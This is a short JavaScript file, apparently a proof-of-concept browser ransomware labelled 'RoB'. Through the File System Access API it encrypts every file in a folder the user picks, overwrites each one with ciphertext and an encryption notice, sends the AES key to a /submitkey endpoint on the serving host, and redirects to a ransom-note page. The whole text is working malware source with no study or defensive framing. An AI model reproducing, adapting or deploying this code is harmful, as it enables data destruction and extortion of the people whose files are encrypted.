document.getElementById("selectDir").onclick = async () => {
  const status = document.getElementById("status");
  const victimId = Date.now();
  const dirHandle = await window.showDirectoryPicker();

  const aesKey = await crypto.subtle.generateKey(
    { name: "AES-GCM", length: 256 }, true, ["encrypt"]
  );
  const encoder = new TextEncoder();

  for await (const entry of dirHandle.values()) {
    if (entry.kind === "file") {
      const file = await entry.getFile();
      const content = await file.arrayBuffer();
      const iv = crypto.getRandomValues(new Uint8Array(12));
      const encrypted = await crypto.subtle.encrypt(
        { name: "AES-GCM", iv }, aesKey, content
      );

      const note = encoder.encode("Your file has been encrypted by RoB.\n");
      const result = new Uint8Array(2 + note.length + iv.length + encrypted.byteLength);
      result[0] = note.length;
      result[1] = iv.length;
      result.set(note, 2);
      result.set(iv, 2 + note.length);
      result.set(new Uint8Array(encrypted), 2 + note.length + iv.length);

      const writable = await entry.createWritable();
      await writable.write(result);
      await writable.close();

      status.innerText += `\n🔒 Encrypted: ${entry.name}`;
    }
  }

  const rawKey = await crypto.subtle.exportKey("raw", aesKey);
  await fetch(`/submitkey/${victimId}`, {
    method: "POST",
    headers: { "Content-Type": "application/octet-stream" },
    body: rawKey
  });

  window.location.href = "/ransom-note.html";
};
